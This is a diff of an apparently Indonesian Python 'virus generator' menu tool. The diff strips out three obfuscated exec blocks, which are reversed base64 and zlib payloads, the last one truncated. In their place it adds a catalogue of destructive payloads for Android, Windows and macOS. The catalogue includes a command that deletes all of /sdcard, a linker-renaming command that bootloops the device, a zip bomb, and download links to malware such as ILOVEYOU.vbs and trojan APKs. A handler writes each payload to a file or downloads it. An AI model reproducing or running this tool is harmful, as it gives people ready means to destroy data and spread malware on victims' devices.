@@ -36,11 +36,90 @@ def banner():
 clear = lambda: os.system('cls' if os.name == 'nt' else 'clear')
 
 # Fungsi untuk membaca data JSON
-
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
-
+def load_virus_data():
+    return {
+        "anvima": [
+		{
+			"name": "Bootloop",
+			"type": "code",
+			"output": "bootloop.sh",
+			"content": "su -c 'rename /system/bin/linker /system/bin/link_lunk'\n"
+		},
+		{
+			"name": "Data-Eater",
+			"type": "code",
+			"output": "data-eater.sh",
+			"content": "su -c rm -rf /sdcard/*\n"
+		},
+		{
+			"name": "Freeze",
+			"type": "url",
+			"output": "freeze.sh",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/freeze.sh"
+		},
+		{
+			"name": "Bomb-Zip",
+			"type": "url",
+			"output": "zipbomb.zip",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/42.zip"
+		},
+		{
+			"name": "Elite",
+			"type": "url",
+			"output": "elite.apk",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/elite.apk"
+		},
+		{
+			"name": "Trash",
+			"type": "url",
+			"output": "trash.sh",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/trash.sh"
+		},
+		{
+			"name": "FBCrack 2K18",
+			"type": "url",
+			"output": "FBCR2K18.apk",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/fbcr.apk"
+		},
+		{
+			"name": "Vi4a",
+			"type": "url",
+			"output": "vi4a.apk",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/vi4a.apk"
+		},
+		{
+			"name": "Malum",
+			"type": "url",
+			"output": "Malum.apk",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/Malum.apk"
+		},
+		{
+			"name": "TakeBeer",
+			"type": "url",
+			"output": "TakeBeer.apk",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/TakeBeer.apk"
+		},
+		{
+			"name": "Mobile Legends: Adventure",
+			"type": "url",
+			"output": "Mobile_Legends_Adventure.apk",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/Mobile_Legends_Adventure.apk"
+		},
+		{
+			"name": "Mobelejen",
+			"type": "url",
+			"output": "mobelejen.apk",
+			"content": "https://github.com/Gameye98/V1RU5/raw/master/mobelejen.apk"
+		}
+        ],
+        "winvima": [
+            {"name": "R.I.P", "type": "url", "output": "RIP.bat", "content": "https://github.com/Gameye98/V1RU5/raw/master/RIP.bat"},
+            {"name": "ILOVEYOU", "type": "url", "output": "ILOVEYOU.vbs", "content": "https://github.com/Gameye98/V1RU5/raw/master/ILOVEYOU.vbs"}
+        ],
+        "macvima": [
+            {"name": "Trinoids", "type": "url", "output": "trinoids.app", "content": "https://github.com/Gameye98/V1RU5/raw/master/trinoids.app"}
+        ]
+    }
 
 # Fungsi untuk menampilkan daftar virus
 def show_virus_list(platform, data):
@@ -52,18 +131,59 @@ def show_virus_list(platform, data):
     print(f'\n{C}[{Y}0{C}] Back to Main Menu{N}\n')
 
 # Fungsi untuk menangani pilihan virus
-
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'=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'))
-
+def handle_virus_choice(platform, data):
+    try:
+        choice = int(input(f'{C}BUNNYSAD {Y}> Choose virus:{N} '))
+        if choice == 0:
+            return
+        elif 1 <= choice <= len(data):
+            virus = data[choice - 1]
+            print(f'{C}[{Y}+{C}] Processing {virus["name"]}...{N}')
+            if virus["type"] == "code":
+                with open(virus["output"], "w") as file:
+                    file.write(virus["content"])
+                print(f'{C}[{Y}+{C}] File created: {virus["output"]}{N}')
+            elif virus["type"] == "url":
+                print(f'{C}[{Y}+{C}] Downloading: {virus["content"]}{N}')
+                urllib.request.urlretrieve(virus["content"], virus["output"])
+                print(f'{C}[{Y}+{C}] File downloaded: {virus["output"]}{N}')
+        else:
+            print(f'{C}[{R}!{C}] Invalid choice. Try again.{N}')
+    except Exception as e:
+        print(f'{C}[{R}!{C}] Error: {e}{N}')
 
 # Menu utama
-
-# Python obfuscation by freecodingtools.org
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==Asp2zcH8/vvP//tsFjaAh3/p9w3qAvMkaWegd6XP5PRROEf6xsz5PkY9HtUFXBrOtdnSEAoJAkAwIAKJUlTYev4EDS4xhh6nkAsDFBmMK9pflpU6A0OEwKxyRE6JDrUoja7cruu1hu3yC7tBmOLrs/YLd5cpeMnBm8k6QpRzoUN/gpt8uR4bHDcZoe9aN55XIgwq8dLjJKlqRwRoFCu0yZAOqzbZqTxB2jd3fGrTpkMuZbFfU7K7PjcW5dN3A5QGD6b0O8LwMLrmN/fxaNDSoXr6e5ptMFESHlbnfY5iER56l5/7eKC2npdhh8RrkpgHaIgkdkZ5lHCcgBdENWm1kaz5C0QXUbvU+wRMmfsBQ5iPd+rItP9OI5i2vzwXqjfpOxAI1S3G2q9bPxLd3xJN4GnLo61yW8G8w/70u6YABdIHyYYICicIkP1U+NOdwT/mSPfEOLptAhym4vgOc35HH2CBgCSvIULsEVJvKh6nvbnoKJYZXgamvPQML6mhm3tTwfbRrmDuclfbINYKDF9huJpU9AIwlzvtF1FsHZ1bZKDwH1a5cZF66BLwtZT3zOvz1zMsaS2KX/W26TEVoZI/wwtEZhJOJ/AIHqMlCpQrNnHNgSxNCailkKAKLBtd3775NfhI0DvHNfynK+H/mXkOBpIV3oJ8NahBku+76fXe7Zse5yCLAF/LVdCMBas4mPqZkZmTOvAvEhxw6Tv+efzlm7NTVN0dK85N2W94LfoYYlZbefLT56k/CWx1V6xQTmRCRv/Ww7ZLecWbhPCZbSFiauFdA3ZGd6ly2ZFdpICM6NUBmA67EJgJt3NtAWcxD1/tU7WQnKE1wJIt/qIUnzGolT55faCvJzAbORTnUUjkwdNtgYPl+1lDyF1/uMFsUbpVw6eCA7ywomrNGRwWWuHXNZnLOUepXXVQlbGSv2p+I81J0FFAuSZIAS2RNi9ZeU+6Evelx7PH6/+5+Y1x5bP/8tnSDd0Hdrb17VUHj67qkiXGAtsqpzz+QAuIwiXgiq68R5yFTsKRAS6PAk/Ni4TWDAUeDz6WyKfF5kmmk2jCHyYinBgllmpg3GYQj5D8QaRar60EdlEeiShI5ZpXRXLCpIGxR3xADBrZ5dhRU2capNIRmvJFqVDRw8+PhgEhOcz/C9bjZHgVilic3ckvLLkFUw0GHCayGvtDzU8UvtsajAXc5ce6Sbo1lCFp79gd//XYaXhqUYxJO6Z6mRJxfPnfcjnps/X9WrX8hSNRX9dp2/oumB6r5Jv